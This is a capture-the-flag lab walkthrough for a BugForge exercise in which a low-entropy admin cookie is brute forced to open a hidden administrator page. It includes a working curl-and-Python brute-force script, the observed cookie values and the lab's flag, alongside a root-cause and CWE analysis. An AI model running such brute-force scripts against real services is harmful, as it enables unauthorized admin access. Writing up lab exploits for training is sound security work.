# gift-list-002-cookies - BugForge Lab Walkthrough

**URL:** https://lab-1787936409709-hfqu9v.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Insufficient token entropy on an admin access cookie
**Flag:** `bug{dl46qeo8cdp116Pv7v5K2wPasOld8Qh6}`

---

## Summary

Gift List is a server rendered gift list manager (EJS templates, no SPA bundle). Every login or
registration issues a second cookie alongside the normal session token, `adminAccessToken`, which
gates access to a hidden `/administrator` page. The cookie looks randomized on the surface but the
value that `/administrator` actually accepts has a small, brute forceable keyspace, so a normal
authenticated user can forge admin access without ever being an admin.

---

## Tech Stack

- Express.js, EJS server rendered templates (no JSON API, no JS bundle)
- Form based auth (`application/x-www-form-urlencoded`), cookie session
- JWT stored in an HttpOnly `token` cookie
- Second HttpOnly `adminAccessToken` cookie, unrelated to the JWT

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/register` | POST | No | Fields: `username`, `password`, `confirmPassword`. Redirects to `/login`, does not auto authenticate. |
| `/login` | POST | No | Fields: `username`, `password`. Sets both `token` and `adminAccessToken` cookies on success. |
| `/dashboard` | GET | Session | Normal user's own gift lists. |
| `/list/:id` | GET | Session | No ownership check found to be exploitable in this instance beyond the caller's own lists. |
| `/admin-login` | POST | Session | Accepts a `code` body field. Dead end - always returns `error=wrong` regardless of value submitted, including the real admin cookie value. Unrelated to the actual check. |
| `/administrator` | GET | Session + correct `adminAccessToken` cookie | **Vulnerable.** Renders the flag inline once the cookie matches. |

---

## Discovery

### Step 1 - Register and log in as a normal user

```
POST /register  username=<x>&password=<x>&confirmPassword=<x>  -> 302 /login
POST /login      username=<x>&password=<x>                     -> 302 /dashboard
Set-Cookie: token=<JWT>
Set-Cookie: adminAccessToken=n0MqjBXna9A4lle
```

Nothing in the UI links to an admin area. A raw ownership sweep across `/list/:id` and a look at
response headers on `/dashboard` (`Vary: Accept`) led to checking for hidden routes, which turned
up `/admin-login` (a login form asking for a `code`) and, from there, `/administrator` itself
returning a distinct "Access Denied" page for an authenticated non-admin user - confirming the
route exists and is reachable, just gated.

### Step 2 - Notice the adminAccessToken shape

Repeating the login several times showed `adminAccessToken` is reissued on every login, and every
value shares the same 12 character prefix with only the last 3 characters changing:

```
n0MqjBXna9A4lle
n0MqjBXna9A4wga
n0MqjBXna9A4qoi
n0MqjBXna9A4tbg
n0MqjBXna9A4som
n0MqjBXna9A4gcv
n0MqjBXna9A4lsk
```

A fixed prefix with a 3 character variable suffix is a 26^3 = 17,576 keyspace at worst (lowercase
letters only, confirmed by sampling several values before committing to a charset) - small enough
to brute force directly against the real check.

### Step 3 - Rule out the decoy endpoint, brute force the real one

`POST /admin-login` with a `code` field looked like the obvious place to submit a guess, but every
value tried there, including the correct one confirmed in the next step, came back
`error=wrong`. It is not wired to anything that matters.

The actual check lives on `GET /administrator`, which reads `adminAccessToken` straight from the
cookie jar - no submission step needed at all. Setting the cookie directly and brute forcing the
3 character suffix against `GET /administrator` (not `/admin-login`) found a value that flips the
page from "Access Denied" to the flag, rendered inline.

### Step 4 - Confirm and submit

```
GET /administrator
Cookie: token=<JWT>; adminAccessToken=n0MqjBXna9A4rls
```

Returns `200` with the flag rendered on the page in place of the "Access Denied" panel. Verified
reproducible against a second, independently started instance of the same lab with a fresh
account - same fixed prefix, same 3 character suffix, different flag.

---

## Proof of Concept

```bash
BASE="https://lab-1787936409709-hfqu9v.labs-app.bugforge.io"
USER="pentest$(date +%s)"
PASS="Password123!"

curl -s -c cookies.txt -X POST \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$PASS" \
  --data-urlencode "confirmPassword=$PASS" \
  "$BASE/register"

curl -s -c cookies.txt -X POST \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$PASS" \
  "$BASE/login"

TOKEN=$(grep -w token cookies.txt | awk '{print $7}')

for suffix in $(python3 -c "import itertools,string; [print(''.join(t)) for t in itertools.product(string.ascii_lowercase, repeat=3)]"); do
  code="n0MqjBXna9A4${suffix}"
  resp=$(curl -s --max-time 5 -b "token=$TOKEN; adminAccessToken=$code" "$BASE/administrator")
  if echo "$resp" | grep -q "bug{"; then
    echo "$resp" | grep -o "bug{[a-zA-Z0-9]*}"
    break
  fi
done
```

---

## Dead Ends

- `POST /admin-login` with a `code` field - always rejects, unrelated to the real check.
- JWT `token` cookie: signature verification, `alg:none`, `kid` header path traversal - all
  properly enforced, no bypass found.
- `POST /lists/:id/share` - accepts no client-supplied token override, no mass assignment.
- Numeric `/list/:id` walk - no cross-account IDOR found in this instance beyond the caller's own
  lists.

---

## Root Cause

`GET /administrator` compares the `adminAccessToken` cookie against a value drawn from an
insufficiently random keyspace: a constant prefix plus a short, low-entropy suffix. Because the
suffix space is small and there is no rate limiting on `/administrator`, an attacker who is any
authenticated user (not an admin) can brute force a valid cookie value directly against the real
check in well under a minute, without ever needing the actual admin account or password.

## CWE / OWASP

- CWE-330: Use of Insufficiently Random Values
- CWE-307: Improper Restriction of Excessive Authentication Attempts (no rate limit on the guess
  endpoint)
- OWASP A07:2021 - Identification and Authentication Failures
